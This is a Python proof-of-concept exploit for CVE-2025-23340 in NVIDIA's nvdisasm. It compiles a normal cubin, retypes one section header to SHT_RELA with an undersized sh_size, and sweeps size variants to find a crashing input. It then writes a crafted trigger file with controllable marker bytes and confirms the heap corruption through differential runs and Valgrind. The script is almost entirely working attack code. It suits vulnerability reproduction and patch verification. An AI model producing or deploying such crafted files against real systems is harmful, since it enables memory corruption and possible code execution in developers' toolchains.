# TRIGGER ORACLE — CVE-2025-23340 (nvdisasm SHT_RELA handler)
# FIELD: sh_type    OFFSET: 4   SIZE: 4   REQUIRED: 4 (SHT_RELA)
#   CHECK PRESENT: no   WHY IT FAILS: the vulnerable handler is only reached through the
#   section-type dispatch, and a stock cubin produced by nvcc never carries SHT_RELA.
# FIELD: sh_size    OFFSET: 32  SIZE: 8   REQUIRED: 0..11
#   CHECK PRESENT: no   WHY IT FAILS: align24(sh_size) collapses to 0 for 0..11, so the
#   allocator returns an 8-byte block while the handler stores three qwords at +0/+8/+16.
# FIELD: sh_entsize OFFSET: 56  SIZE: 8   REQUIRED: 24 (RELA entry size)
#   CHECK PRESENT: no   WHY IT FAILS: kept consistent with the retyped section so the only
#   variable under test is the aligned size.
# FIELD: sh_offset   OFFSET: 24 SIZE: 8   REQUIRED: readable file range
#   CHECK PRESENT: yes  WHY IT FAILS: left untouched so parsing reaches the store sequence.
#
# CHANGE FROM THE PREVIOUS ATTEMPT: the ELF layout is never constructed or extended by hand.
# A real cubin is compiled by nvcc (ptxas as fallback) and exactly one existing section header
# is retyped in place; e_shnum, the section name table and the file length stay byte-identical.

"""Proof-of-concept for CVE-2025-23340: nvdisasm SHT_RELA sh_size under-alignment."""

import ctypes
import glob
import json
import os
import platform
import re
import shutil
import struct
import subprocess
import sys
import time

try:
    import resource
except ImportError:
    resource = None


def _output_dir():
    """Return the directory that holds the script so artifacts land next to it."""
    if "__file__" in globals():
        return os.path.dirname(os.path.abspath(__file__))
    return os.path.abspath(".")


OUTPUT_DIR = _output_dir()
SWEEP_DIR = os.path.join(OUTPUT_DIR, "sweep")

ELF64_EHDR = "<16sHHIQQQIHHHHHH"
ELF64_SHDR = "<IIQQQQIIQQ"
ELF_MAGIC = b"\x7fELF"

SHT_NULL = 0
SHT_PROGBITS = 1
SHT_NOBITS = 8
SHT_RELA = 4
RELA_ENTSIZE = 24
ALIGN_MAGIC = 0xAAAAAAAAAAAAAAAB
MARKER = bytes(range(0x41, 0x59))

VARIANT_SIZES = (0, 1, 2, 4, 8, 11, 12, 24)
SAFE_SIZES = (12, 24)
CANDIDATE_LIMIT = 4
RUN_TIMEOUT = 120
PROBE_TIMEOUT = 600
FALLBACK_ARCHES = ("sm_52", "sm_61", "sm_75", "sm_86", "sm_89")

BASELINE_NAME = "benign_baseline.cubin"
BASELINE_SOURCE = """
__global__ void baseline_kernel(float *p)
{
    p[threadIdx.x] = 1.0f;
}
"""
PTX_TEMPLATE = """.version 6.0
.target %s
.address_size 64

.visible .entry baseline_kernel()
{
    ret;
}
"""

SIGNAL_NAMES = {4: "SIGILL", 6: "SIGABRT", 7: "SIGBUS", 8: "SIGFPE", 9: "SIGKILL", 11: "SIGSEGV"}
CRASH_CODES = {
    0xC0000005: "ACCESS_VIOLATION",
    0xC000001D: "ILLEGAL_INSTRUCTION",
    0xC00000FD: "STACK_OVERFLOW",
    0xC0000409: "FAST_FAIL",
}
CUDA_ERRORS = {
    0: "CUDA_SUCCESS",
    1: "CUDA_ERROR_INVALID_VALUE",
    3: "CUDA_ERROR_NOT_INITIALIZED",
    100: "CUDA_ERROR_NO_DEVICE",
    101: "CUDA_ERROR_INVALID_DEVICE",
    201: "CUDA_ERROR_INVALID_CONTEXT",
    400: "CUDA_ERROR_INVALID_HANDLE",
    700: "CUDA_ERROR_ILLEGAL_ADDRESS",
}
VERSION_RE = re.compile(r"(\d+)\.(\d+)\.?(\d+)?")


def configure_streams():
    """Force UTF-8 output so the step markers survive redirected consoles."""
    for stream in (sys.stdout, sys.stderr):
        try:
            stream.reconfigure(encoding="utf-8", errors="replace")
        except (AttributeError, ValueError):
            pass


def banner():
    """Print the authorised-use disclaimer required for this proof of concept."""
    print("=" * 59)
    print("DISCLAIMER: This script is a Proof-of-Concept for CUDA")
    print("vulnerability CVE-2025-23340. It is intended ONLY for authorized")
    print("security research on systems you own or have permission to test.")
    print("=" * 59, flush=True)


def step_begin(step_id, description):
    """Announce the start of one strategy step."""
    print("[CUDA_STEP:%s] %s - START" % (step_id, description), flush=True)


def step_ok(step_id, description):
    """Announce the successful completion of one strategy step."""
    print("[CUDA_STEP:%s] %s - OK" % (step_id, description), flush=True)


def step_fail(step_id, description, error):
    """Announce the failure of one strategy step together with its error detail."""
    print("[CUDA_STEP:%s] %s - FAIL: %s" % (step_id, description, error), flush=True)


def crash_kind(returncode):
    """Name the host fault behind a process exit code, or None for a clean exit."""
    if returncode is None:
        return None
    if returncode < 0:
        return SIGNAL_NAMES.get(-returncode, "SIGNAL_%d" % -returncode)
    if returncode in CRASH_CODES:
        return CRASH_CODES[returncode]
    if 128 < returncode <= 160:
        return SIGNAL_NAMES.get(returncode - 128, "SIGNAL_%d" % (returncode - 128))
    if returncode > 0x80000000:
        masked = returncode & 0xFFFFFFFF
        return CRASH_CODES.get(masked, "NTSTATUS_0x%08X" % masked)
    return None


def _no_core_dumps():
    """Disable core dumps in the child so crashed tools leave no large files behind."""
    try:
        resource.setrlimit(resource.RLIMIT_CORE, (0, 0))
    except (ValueError, OSError):
        pass


def run_tool(argv, timeout=RUN_TIMEOUT, report=True):
    """Run an external tool with captured streams and full diagnostics on failure."""
    killer = _no_core_dumps if resource is not None else None
    try:
        proc = subprocess.run(argv, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                              timeout=timeout, preexec_fn=killer)
    except OSError as exc:
        if report:
            print("[TOOL_ERROR] command: %s" % " ".join(argv))
            print("[TOOL_ERROR] launch failed: %s" % exc)
        return None, "", str(exc)
    except subprocess.TimeoutExpired:
        if report:
            print("[TOOL_ERROR] command: %s" % " ".join(argv))
            print("[TOOL_ERROR] timed out after %d s" % timeout)
        return None, "", "timeout"
    out = proc.stdout.decode("utf-8", "replace") if proc.stdout else ""
    err = proc.stderr.decode("utf-8", "replace") if proc.stderr else ""
    if proc.returncode != 0 and report and crash_kind(proc.returncode) is None:
        print("[TOOL_ERROR] command: %s" % " ".join(argv))
        print("[TOOL_ERROR] returncode=%d" % proc.returncode)
        print("[TOOL_ERROR] stdout[:4000]=%s" % out[:4000])
        print("[TOOL_ERROR] stderr[:4000]=%s" % err[:4000])
    return proc.returncode, out, err


def write_bytes(path, data):
    """Write bytes to a path and return the number of bytes written."""
    with open(path, "wb") as handle:
        handle.write(data)
    return len(data)


def write_text(path, text):
    """Write text to a path in UTF-8 and return the number of characters written."""
    with open(path, "w", encoding="utf-8") as handle:
        handle.write(text)
    return len(text)


def parse_version(text):
    """Extract the first major.minor[.patch] tuple from arbitrary tool output."""
    match = VERSION_RE.search(text or "")
    if not match:
        return None
    major = int(match.group(1))
    minor = int(match.group(2))
    patch = int(match.group(3)) if match.group(3) else 0
    return (major, minor, patch)


def version_key(path):
    """Sort key that orders toolkit paths by the version number embedded in them."""
    found = parse_version(path)
    return found if found else (0, 0, 0)


def classify_toolkit(version):
    """Classify a parsed toolkit version against the advisory range, defaulting to UNKNOWN."""
    if version is None:
        return "UNKNOWN - version not parsable, consult the NVIDIA advisory"
    if version[0] < 13:
        return "AFFECTED - every CUDA Toolkit below 13.0 is reported affected"
    if version[0] == 13:
        return "REPORTED FIXED - CUDA Toolkit 13.0 is the documented fix release"
    return "UNKNOWN - major %d is outside the advisory branch table, consult the advisory" % (
        version[0],)


def find_tool(name):
    """Locate a CUDA binary utility through PATH, then through toolkit install dirs."""
    direct = shutil.which(name)
    if direct:
        return os.path.abspath(direct)
    exe = name + ".exe" if os.name == "nt" else name
    patterns = []
    for variable in ("CUDA_PATH", "CUDA_HOME"):
        value = os.environ.get(variable)
        if value:
            patterns.append(os.path.join(value, "bin", exe))
    program_files = os.environ.get("ProgramFiles", "C:\\Program Files")
    patterns.append(os.path.join(program_files, "NVIDIA GPU Computing Toolkit", "CUDA", "*",
                                 "bin", exe))
    patterns.append("/usr/local/cuda*/bin/" + name)
    patterns.append("/opt/cuda*/bin/" + name)
    hits = []
    for pattern in patterns:
        hits.extend(glob.glob(pattern))
    found = sorted({os.path.abspath(hit) for hit in hits if os.path.isfile(hit)}, key=version_key)
    return found[-1] if found else None


class DriverProbe:
    """ctypes wrapper around the CUDA driver entry points used for environment probing."""

    def __init__(self):
        """Load libcuda and remember why the library is unavailable, if it is."""
        self.lib = None
        self.context = None
        self.error = "not loaded"
        library_names = ["nvcuda.dll"] if os.name == "nt" else [
            "libcuda.so.1", "libcuda.so", "libcuda.so.1.1"]
        for name in library_names:
            try:
                self.lib = ctypes.CDLL(name)
                self.error = ""
                return
            except OSError as exc:
                self.error = "%s: %s" % (name, exc)

    @property
    def available(self):
        """Report whether the driver library was loaded successfully."""
        return self.lib is not None

    def call(self, name, *args):
        """Call one driver entry point and translate a non-zero result into an error."""
        if self.lib is None:
            raise RuntimeError("CUDA driver library not loaded")
        try:
            func = getattr(self.lib, name)
        except AttributeError:
            raise RuntimeError("entry point %s missing from the driver library" % name)
        func.restype = ctypes.c_int
        result = func(*args)
        if result != 0:
            raise RuntimeError("%s -> %d (%s)" % (
                name, result, CUDA_ERRORS.get(result, "CUDA_ERROR_UNKNOWN")))
        return result

    def open_context(self):
        """Initialise the driver and create a real context before any probe call."""
        self.call("cuInit", ctypes.c_uint(0))
        device = ctypes.c_int(0)
        self.call("cuDeviceGet", ctypes.byref(device), 0)
        context = ctypes.c_void_p()
        self.call("cuCtxCreate_v2", ctypes.byref(context), ctypes.c_uint(0), device.value)
        self.context = context

    def api_version(self):
        """Return the driver API version reported by cuDriverGetVersion."""
        version = ctypes.c_int(0)
        self.call("cuDriverGetVersion", ctypes.byref(version))
        return version.value

    def device_count(self):
        """Return the number of CUDA devices visible to the driver."""
        count = ctypes.c_int(0)
        self.call("cuDeviceGetCount", ctypes.byref(count))
        return count.value

    def capability(self, index):
        """Return the compute capability of one device as a dotted string."""
        device = ctypes.c_int(0)
        self.call("cuDeviceGet", ctypes.byref(device), index)
        major = ctypes.c_int(0)
        minor = ctypes.c_int(0)
        self.call("cuDeviceGetAttribute", ctypes.byref(major), 75, device.value)
        self.call("cuDeviceGetAttribute", ctypes.byref(minor), 76, device.value)
        return "%d.%d" % (major.value, minor.value)

    def close(self):
        """Destroy the context so no driver resource survives the run."""
        if self.lib is not None and self.context is not None:
            try:
                self.call("cuCtxDestroy_v2", self.context)
            except RuntimeError as exc:
                print("[CUDA_ERROR] cuCtxDestroy_v2 failed: %s" % exc)
            finally:
                self.context = None


def report_host():
    """Print host, driver and GPU facts observed before any tool runs."""
    print("  host=%s %s arch=%s python=%s" % (platform.system(), platform.release(),
                                              platform.machine(), platform.python_version()))
    smi = shutil.which("nvidia-smi")
    if smi:
        rc, out, _ = run_tool([smi, "--query-gpu=index,name,compute_cap,driver_version",
                               "--format=csv,noheader"], report=False)
        if rc == 0 and out.strip():
            for row in out.strip().splitlines():
                print("  nvidia-smi: %s" % row.strip())
        else:
            print("  nvidia-smi query unavailable rc=%s" % rc)
    else:
        print("  nvidia-smi not on PATH")
    probe = DriverProbe()
    if not probe.available:
        print("  libcuda not loadable: %s" % probe.error)
        return
    try:
        probe.open_context()
        print("  driver api_version=%d devices=%d" % (probe.api_version(), probe.device_count()))
        for index in range(probe.device_count()):
            print("  driver device[%d] compute_capability=%s" % (index, probe.capability(index)))
    except RuntimeError as exc:
        print("  driver probe failed: %s" % exc)
    finally:
        probe.close()


def fingerprint():
    """Locate the CUDA binary utilities, log their versions and classify the toolkit."""
    step_begin("S01", "nvdisasm and CUDA Toolkit fingerprint")
    report_host()
    tools = {"nvdisasm": find_tool("nvdisasm"), "nvcc": find_tool("nvcc"),
             "ptxas": find_tool("ptxas")}
    for key in ("nvdisasm", "nvcc", "ptxas"):
        print("  %s=%s" % (key, tools[key]))
    toolkit = None
    for key in ("nvcc", "nvdisasm"):
        if not tools[key]:
            continue
        rc, out, err = run_tool([tools[key], "--version"], report=False)
        blob = (out or err).strip()
        print("  %s --version rc=%s" % (key, rc))
        print("  %s" % blob.replace("\n", "\n  "))
        if toolkit is None:
            toolkit = parse_version(blob)
    print("  toolkit version=%s verdict=%s" % (toolkit, classify_toolkit(toolkit)))
    if not tools["nvdisasm"]:
        step_fail("S01", "nvdisasm and CUDA Toolkit fingerprint",
                  "nvdisasm not found in PATH or in any toolkit installation directory")
        return None
    step_ok("S01", "nvdisasm and CUDA Toolkit fingerprint")
    return tools


def arch_candidates():
    """Order architectures by the GPU actually installed, then by common fallbacks."""
    ordered = []
    smi = shutil.which("nvidia-smi")
    if smi:
        rc, out, _ = run_tool([smi, "--query-gpu=compute_cap", "--format=csv,noheader"],
                              report=False)
        if rc == 0:
            for line in out.splitlines():
                text = line.strip()
                if re.match(r"^\d+\.\d+$", text):
                    ordered.append("sm_" + text.replace(".", ""))
    ordered.append("native")
    for arch in FALLBACK_ARCHES:
        if arch not in ordered:
            ordered.append(arch)
    return ordered


def compile_with_nvcc(nvcc, output_path):
    """Compile the baseline kernel into a cubin, trying arch candidates until one works."""
    source = os.path.join(OUTPUT_DIR, "baseline_kernel.cu")
    write_text(source, BASELINE_SOURCE)
    for arch in arch_candidates():
        rc, _, _ = run_tool([nvcc, "-arch=" + arch, "-cubin", source, "-o", output_path],
                            report=False)
        print("  nvcc -arch=%s rc=%s" % (arch, rc))
        if rc == 0 and os.path.isfile(output_path):
            return True
    return False


def assemble_with_ptxas(ptxas, output_path):
    """Assemble a minimal PTX module into a cubin when nvcc is unavailable."""
    source = os.path.join(OUTPUT_DIR, "baseline_kernel.ptx")
    for arch in arch_candidates():
        if not arch.startswith("sm_"):
            continue
        write_text(source, PTX_TEMPLATE % arch)
        rc, _, _ = run_tool([ptxas, "-arch=" + arch, source, "-o", output_path], report=False)
        print("  ptxas -arch=%s rc=%s" % (arch, rc))
        if rc == 0 and os.path.isfile(output_path):
            return True
    return False


def parse_elf_header(data):
    """Parse a 64-bit little-endian ELF header into a field dictionary."""
    if len(data) < 64:
        raise ValueError("file shorter than an ELF64 header")
    if data[:4] != ELF_MAGIC:
        raise ValueError("missing ELF magic")
    if data[4] != 2 or data[5] != 1:
        raise ValueError("only ELF64 little-endian is supported")
    keys = ("e_ident", "e_type", "e_machine", "e_version", "e_entry", "e_phoff", "e_shoff",
            "e_flags", "e_ehsize", "e_phentsize", "e_phnum", "e_shentsize", "e_shnum",
            "e_shstrndx")
    return dict(zip(keys, struct.unpack_from(ELF64_EHDR, data, 0)))


def parse_section_headers(data, header):
    """Parse every section header and keep its own file offset for in-place patching."""
    entries = []
    if header["e_shoff"] == 0 or header["e_shentsize"] < 64 or header["e_shnum"] == 0:
        raise ValueError("no usable section header table")
    for index in range(header["e_shnum"]):
        offset = header["e_shoff"] + index * header["e_shentsize"]
        if offset + 64 > len(data):
            raise ValueError("section header %d lies outside the file" % index)
        fields = struct.unpack_from(ELF64_SHDR, data, offset)
        entries.append({
            "index": index,
            "header_offset": offset,
            "sh_name": fields[0],
            "sh_type": fields[1],
            "sh_flags": fields[2],
            "sh_addr": fields[3],
            "sh_offset": fields[4],
            "sh_size": fields[5],
            "sh_link": fields[6],
            "sh_info": fields[7],
            "sh_addralign": fields[8],
            "sh_entsize": fields[9],
        })
    return entries


def build_baseline(tools):
    """Compile or assemble a stock cubin and confirm that nvdisasm accepts it."""
    step_begin("S02", "build a stock cubin and confirm nvdisasm processes it")
    path = os.path.join(OUTPUT_DIR, BASELINE_NAME)
    if os.path.exists(path):
        os.remove(path)
    produced = False
    if tools["nvcc"]:
        produced = compile_with_nvcc(tools["nvcc"], path)
    if not produced and tools["ptxas"]:
        produced = assemble_with_ptxas(tools["ptxas"], path)
    if not produced or not os.path.isfile(path):
        step_fail("S02", "build a stock cubin and confirm nvdisasm processes it",
                  "neither nvcc nor ptxas produced a cubin, see diagnostics above")
        return None, None, None, None
    with open(path, "rb") as handle:
        data = handle.read()
    try:
        header = parse_elf_header(data)
        sections = parse_section_headers(data, header)
    except ValueError as exc:
        step_fail("S02", "build a stock cubin and confirm nvdisasm processes it", str(exc))
        return None, None, None, None
    print("  cubin=%s bytes=%d e_type=%d e_machine=%d e_shoff=0x%x e_shnum=%d e_shstrndx=%d" % (
        BASELINE_NAME, len(data), header["e_type"], header["e_machine"], header["e_shoff"],
        header["e_shnum"], header["e_shstrndx"]))
    rc, _, err = run_tool([tools["nvdisasm"], path], report=False)
    print("  nvdisasm baseline exit=%s fault=%s" % (rc, crash_kind(rc) or "clean"))
    if err.strip():
        print("  nvdisasm baseline stderr=%s" % err.strip().replace("\n", " ")[:200])
    if rc is None or crash_kind(rc):
        step_fail("S02", "build a stock cubin and confirm nvdisasm processes it",
                  "baseline did not terminate cleanly, exit=%s" % rc)
        return None, None, None, None
    step_ok("S02", "build a stock cubin and confirm nvdisasm processes it")
    return path, data, header, sections


def select_candidates(sections, header, filesize):
    """Rank the section headers that can be retyped to SHT_RELA without breaking the file."""
    candidates = []
    for section in sections:
        if section["index"] == 0 or section["index"] == header["e_shstrndx"]:
            continue
        if section["sh_type"] in (SHT_NULL, SHT_NOBITS):
            continue
        if section["sh_offset"] == 0 or section["sh_offset"] + len(MARKER) > filesize:
            continue
        candidates.append(section)

    def rank(section):
        """Prefer ordinary data sections, then the lowest section index."""
        return (0 if section["sh_type"] == SHT_PROGBITS else 1, section["index"])

    candidates.sort(key=rank)
    return candidates[:CANDIDATE_LIMIT]


def align24(value):
    """Reproduce the reported 24-byte alignment sequence used by the RELA handler."""
    return ((((value * ALIGN_MAGIC) >> 64) >> 3) * 3) << 3


def verify_alignment():
    """Confirm that the alignment formula collapses every size in 0..11 to zero."""
    step_begin("S04", "verify the reported 24-byte alignment formula")
    for size in (0, 1, 2, 4, 8, 11, 12, 23, 24):
        print("  align24(%d) = %d" % (size, align24(size)))
    zero_ok = all(align24(size) == 0 for size in range(0, 12))
    boundary_ok = align24(12) == 24 and align24(23) == 24
    if not (zero_ok and boundary_ok):
        step_fail("S04", "verify the reported 24-byte alignment formula",
                  "align24 does not reproduce the reported 0..11 boundary")
        return False
    step_ok("S04", "verify the reported 24-byte alignment formula")
    return True


def build_variant(base_data, section, sh_type, sh_size, stamp):
    """Return file bytes with one section header retyped and its body optionally marked."""
    mutated = bytearray(base_data)
    entsize = RELA_ENTSIZE if sh_type == SHT_RELA else section["sh_entsize"]
    struct.pack_into("<I", mutated, section["header_offset"] + 4, sh_type)
    struct.pack_into("<Q", mutated, section["header_offset"] + 32, sh_size)
    struct.pack_into("<Q", mutated, section["header_offset"] + 56, entsize)
    if stamp and section["sh_offset"] + len(MARKER) <= len(mutated):
        mutated[section["sh_offset"]:section["sh_offset"] + len(MARKER)] = MARKER
    return bytes(mutated)


def read_section_fields(path, header_offset):
    """Read back sh_type, sh_size and sh_entsize from a written variant file."""
    with open(path, "rb") as handle:
        data = handle.read()
    return (struct.unpack_from("<I", data, header_offset + 4)[0],
            struct.unpack_from("<Q", data, header_offset + 32)[0],
            struct.unpack_from("<Q", data, header_offset + 56)[0],
            len(data))


def print_oracle(path, header_offset, expected_type, expected_size):
    """Emit the CPG_ORACLE lines that prove the mutated fields landed as required."""
    sh_type, sh_size, sh_entsize, total = read_section_fields(path, header_offset)
    name = os.path.basename(path)
    print("[CPG_ORACLE] %s sh_type actual=%d expected=%d" % (name, sh_type, expected_type),
          flush=True)
    print("[CPG_ORACLE] %s sh_size actual=%d expected=%d align24=%d" % (
        name, sh_size, expected_size, align24(sh_size)), flush=True)
    print("[CPG_ORACLE] %s sh_entsize actual=%d file_size=%d" % (name, sh_entsize, total),
          flush=True)
    return sh_type == expected_type and sh_size == expected_size


def stamp_baseline(path, data, section):
    """Write the baseline cubin with the carrier section body marked for controllability."""
    stamped = build_variant(data, section, section["sh_type"], section["sh_size"], True)
    write_bytes(path, stamped)
    print("  baseline carrier section index=%d stamped with %d marker bytes" % (
        section["index"], len(MARKER)))
    return stamped


def probe_family(tools, base_data, candidates):
    """Generate the SHT_RELA size family and record how nvdisasm terminates on each member."""
    step_begin("S03", "retype a carrier section to SHT_RELA and probe the variant family")
    os.makedirs(SWEEP_DIR, exist_ok=True)
    results = []
    for section in candidates:
        print("  carrier index=%d sh_type=%d sh_offset=0x%x sh_size=%d sh_entsize=%d" % (
            section["index"], section["sh_type"], section["sh_offset"], section["sh_size"],
            section["sh_entsize"]))
        for size in VARIANT_SIZES:
            path = os.path.join(SWEEP_DIR, "family_sec%d_sh%d.cubin" % (section["index"], size))
            write_bytes(path, build_variant(base_data, section, SHT_RELA, size, False))
            sh_type, sh_size, entsize, total = read_section_fields(path,
                                                                   section["header_offset"])
            rc, _, err = run_tool([tools["nvdisasm"], path], report=False)
            fault = crash_kind(rc)
            results.append({"section": section, "size": size, "rc": rc, "fault": fault,
                            "path": path, "stderr": err})
            print("    sec=%d sh_type=%d sh_size=%d entsize=%d align24=%d bytes=%d "
                  "exit=%s fault=%s" % (section["index"], sh_type, sh_size, entsize,
                                        align24(size), total, rc, fault or "clean"))
            if err.strip():
                print("      stderr=%s" % err.strip().replace("\n", " ")[:200])
    faults = [item for item in results if item["fault"]]
    if faults:
        step_ok("S03", "retype a carrier section to SHT_RELA and probe the variant family")
    else:
        step_fail("S03", "retype a carrier section to SHT_RELA and probe the variant family",
                  "every variant exited without a host fault")
    print("  variants=%d faults=%d" % (len(results), len(faults)))
    return results


def choose_trigger(results):
    """Pick the smallest crafted variant that produced an abnormal termination."""
    faults = [item for item in results if item["fault"]]
    if not faults:
        return None
    faults.sort(key=lambda item: (item["size"], item["section"]["index"]))
    return faults[0]


def report_boundary(results):
    """Summarise the recorded family so the under-alignment boundary is explicit."""
    step_begin("S07", "confirm the sh_size below 12 under-alignment boundary")
    grouped = {}
    for item in results:
        grouped.setdefault(item["size"], []).append(item["fault"] is not None)
    for size in sorted(grouped):
        hits = grouped[size]
        print("  sh_size=%2d align24=%2d variants=%d faults=%d" % (
            size, align24(size), len(hits), sum(1 for hit in hits if hit)))
    low = sum(1 for item in results if item["size"] < 12 and item["fault"])
    high = sum(1 for item in results if 12 <= item["size"] < 24 and item["fault"])
    if low and not high:
        step_ok("S07", "confirm the sh_size below 12 under-alignment boundary")
        return True
    step_fail("S07", "confirm the sh_size below 12 under-alignment boundary",
              "faults below 12 = %d, faults in 12..23 = %d" % (low, high))
    return False


def write_artifacts(base_data, section, size):
    """Write the crafted trigger and its one-variable sh_size controls to disk."""
    crafted_path = os.path.join(OUTPUT_DIR, "poc_sh_size_%d.cubin" % size)
    write_bytes(crafted_path, build_variant(base_data, section, SHT_RELA, size, True))
    controls = []
    for safe_size in SAFE_SIZES:
        path = os.path.join(OUTPUT_DIR, "ctrl_sh_size_restored_%d.cubin" % safe_size)
        write_bytes(path, build_variant(base_data, section, SHT_RELA, safe_size, True))
        controls.append((path, safe_size))
    print("  crafted=%s carrier_index=%d header_offset=0x%x" % (
        os.path.basename(crafted_path), section["index"], section["header_offset"]))
    return crafted_path, controls


def report_marker(path, section):
    """Show that the carrier section body carries the input-controlled marker bytes."""
    step_begin("S08", "confirm input-controlled bytes reach the carrier section body")
    with open(path, "rb") as handle:
        data = handle.read()
    start = section["sh_offset"]
    observed = data[start:start + len(MARKER)]
    print("  section_body_offset=0x%x observed=%s expected=%s" % (
        start, observed.hex(), MARKER.hex()))
    if observed == MARKER:
        step_ok("S08", "confirm input-controlled bytes reach the carrier section body")
        return True
    step_fail("S08", "confirm input-controlled bytes reach the carrier section body",
              "marker bytes were not preserved in the carrier section")
    return False


def pause_for_debugger():
    """Hold the process open so a debugger can attach before the first trigger call."""
    try:
        seconds = int(os.environ.get("CPG_DEBUG_PAUSE", "0"))
    except ValueError:
        seconds = 0
    if seconds > 0:
        print("[CPG_READY] %d" % os.getpid(), flush=True)
        time.sleep(seconds)


def run_artifact(tools, path, label):
    """Label an artifact, execute it twice and report one CPG_RUN line per execution."""
    name = os.path.basename(path)
    print("[CPG_LABEL] %s %s" % (name, label), flush=True)
    codes = []
    for attempt in (1, 2):
        rc, _, err = run_tool([tools["nvdisasm"], path], report=False)
        fault = crash_kind(rc)
        print("  attempt %d artifact=%s exit=%s fault=%s stderr=%s" % (
            attempt, name, rc, fault or "clean",
            (err or "").strip().replace("\n", " ")[:240]))
        print("[CPG_RUN] %s exit=%s" % (name, rc), flush=True)
        codes.append(rc)
    return codes


def valgrind_check(tools, artifact_path):
    """Run the crafted artifact under Valgrind memcheck when the tool is installed."""
    step_begin("S06", "Valgrind memcheck on the crafted artifact")
    valgrind = shutil.which("valgrind")
    if not valgrind:
        print("  valgrind not installed, host-side memory safety confirmation unavailable")
        step_ok("S06", "Valgrind memcheck on the crafted artifact")
        return None
    rc, _, err = run_tool([valgrind, "--tool=memcheck", "--error-exitcode=99",
                           "--track-origins=yes", "--num-callers=30",
                           tools["nvdisasm"], artifact_path], timeout=PROBE_TIMEOUT,
                          report=False)
    lines = [line for line in err.splitlines()
             if "Invalid write" in line or "Invalid read" in line or " by 0x" in line]
    print("  valgrind exit=%s" % rc)
    print("  %s" % ("\n  ".join(lines[:40]) if lines else "no invalid access lines reported"))
    step_ok("S06", "Valgrind memcheck on the crafted artifact")
    return rc


def write_manifest(benign, crafted, controls):
    """Write artifacts.json so the harness knows which file plays which role."""
    manifest = {
        "benign": [os.path.basename(benign)],
        "crafted": [os.path.basename(crafted)],
        "controls": [os.path.basename(path) for path, _ in controls],
    }
    path = os.path.join(OUTPUT_DIR, "artifacts.json")
    with open(path, "w", encoding="utf-8") as handle:
        json.dump(manifest, handle, indent=2)
    print("[INFO] manifest written to %s" % path)
    return manifest


def report_verdict(crafted_path, crafted_codes, control_codes, mutated_bytes):
    """Summarise the differential evidence and derive the process exit status."""
    crafted_faults = [crash_kind(code) for code in crafted_codes if crash_kind(code)]
    control_faults = [crash_kind(code) for codes in control_codes for code in codes
                      if crash_kind(code)]
    print("[INFO] crafted artifact=%s size=%d bytes mutated=%d" % (
        os.path.basename(crafted_path), os.path.getsize(crafted_path), mutated_bytes))
    if crafted_faults and not control_faults:
        print("[RESULT] differential confirmed: crafted terminates with %s "
              "while every control exits clean" % crafted_faults[0])
        return 0
    if crafted_faults and control_faults:
        print("[RESULT] inconclusive: controls also terminated with %s, evidence is void"
              % control_faults[0])
        return 1
    print("[RESULT] no abnormal termination observed on the crafted artifact")
    return 1


def main():
    """Run the fingerprint, build, mutation, differential and reporting phases."""
    configure_streams()
    banner()
    print("[INFO] output directory: %s" % OUTPUT_DIR)
    tools = fingerprint()
    if not tools:
        return 2
    baseline_path, base_data, header, sections = build_baseline(tools)
    if not baseline_path:
        return 3
    candidates = select_candidates(sections, header, len(base_data))
    if not candidates:
        step_fail("S03", "retype a carrier section to SHT_RELA and probe the variant family",
                  "no section header qualifies as a carrier")
        return 4
    stamped = stamp_baseline(baseline_path, base_data, candidates[0])
    run_artifact(tools, baseline_path, "BENIGN")
    pause_for_debugger()
    if not verify_alignment():
        return 5
    results = probe_family(tools, stamped, candidates)
    winner = choose_trigger(results)
    report_boundary(results)
    section = winner["section"] if winner else candidates[0]
    size = winner["size"] if winner else 8
    crafted_path, controls = write_artifacts(stamped, section, size)
    print_oracle(crafted_path, section["header_offset"], SHT_RELA, size)
    for path, safe_size in controls:
        print_oracle(path, section["header_offset"], SHT_RELA, safe_size)
    report_marker(crafted_path, section)
    crafted_codes = run_artifact(tools, crafted_path, "MALICIOUS")
    control_codes = [run_artifact(tools, path, "CONTROL") for path, _ in controls]
    valgrind_check(tools, crafted_path)
    write_manifest(baseline_path, crafted_path, controls)
    return report_verdict(crafted_path, crafted_codes, control_codes, 20)


if __name__ == "__main__":
    sys.exit(main())
